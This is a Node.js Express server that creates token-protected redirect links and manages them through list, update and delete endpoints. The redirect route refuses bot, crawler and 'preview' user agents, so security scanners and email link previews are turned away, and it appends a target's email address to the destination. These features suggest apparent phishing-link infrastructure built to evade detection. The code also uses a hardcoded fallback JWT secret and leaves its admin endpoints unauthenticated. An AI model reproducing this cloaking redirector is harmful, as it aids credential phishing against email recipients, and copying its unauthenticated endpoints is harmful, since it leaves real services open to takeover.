require("dotenv").config();
const express = require("express");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");
const rateLimit = require("express-rate-limit");
const db = require("./db");

const app = express();
const PORT = process.env.PORT || 3000;

const JWT_SECRET = process.env.JWT_SECRET || "fallback_secret";

// Middleware
app.use(express.json());
app.use(express.static("public"));

// Rate Limiting
const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 10,
    message: "Too many requests. Try again later."
});

app.use(limiter);

// Generate random key
function generateUniqueKey() {
    return crypto.randomBytes(8).toString("hex");
}

// Create JWT token
function generateToken(key) {
    return jwt.sign({ key }, JWT_SECRET);
}

// ---------------------- ADD REDIRECT ----------------------
app.post("/add-redirect", async (req, res) => {
    const { destination } = req.body;

    if (!destination || !/^https?:\/\//.test(destination)) {
        return res.status(400).json({ message: "Invalid destination URL." });
    }

    const key = generateUniqueKey();
    const token = generateToken(key);

    try {
        await db.addRedirect(key, destination, token);
        const baseUrl = `${req.protocol}://${req.get("host")}`;

        res.json({
            message: "Redirect added successfully!",
            redirectUrl: `${baseUrl}/${key}?token=${token}`,
            pathRedirectUrl: `${baseUrl}/${key}/${token}`
        });

    } catch (err) {
        console.error("DB error on addRedirect:", err);
        res.status(500).json({ message: "Failed to save redirect." });
    }
});

// ---------------------- REDIRECT ----------------------
app.get("/:key/:token", async (req, res) => {
    const { key, token } = req.params;
    const email = req.query.email || null;
    const userAgent = req.headers["user-agent"] || "";

    if (/bot|crawl|spider|preview/i.test(userAgent)) {
        return res.status(403).send("Access denied.");
    }

    if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return res.status(400).send("Invalid email.");
    }

    try {
        jwt.verify(token, JWT_SECRET);

        const row = await db.getRedirect(key);

        if (!row) return res.status(404).send("Redirect not found.");
        if (row.token !== token) return res.status(403).send("Invalid token.");

        let destination = row.destination;
        if (email) {
            destination = destination.endsWith("/")
                ? destination + email
                : `${destination}/${email}`;
        }

        return res.redirect(destination);

    } catch (err) {
        console.error("Redirect error:", err.message);
        return res.status(403).send("Invalid or expired token.");
    }
});

// ---------------------- DASHBOARD LIST ----------------------
app.get("/redirects", async (req, res) => {
    try {
        const redirects = await db.getAllRedirects();
        res.json(redirects);
    } catch {
        res.status(500).json({ message: "Failed to fetch redirects" });
    }
});

// ---------------------- UPDATE ----------------------
app.put("/redirects/:key", async (req, res) => {
    const { key } = req.params;
    const { destination } = req.body;

    if (!destination || !/^https?:\/\//.test(destination)) {
        return res.status(400).json({ message: "Invalid destination URL." });
    }

    try {
        await db.updateRedirect(key, destination);
        res.json({ message: "Redirect updated." });
    } catch {
        res.status(500).json({ message: "Failed to update redirect." });
    }
});

// ---------------------- DELETE ----------------------
app.delete("/redirects/:key", async (req, res) => {
    const { key } = req.params;

    try {
        await db.deleteRedirect(key);
        res.json({ message: "Redirect deleted." });
    } catch {
        res.status(500).json({ message: "Failed to delete redirect." });
    }
});

// 404
app.use((req, res) => {
    res.status(404).send("Error: Invalid request.");
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
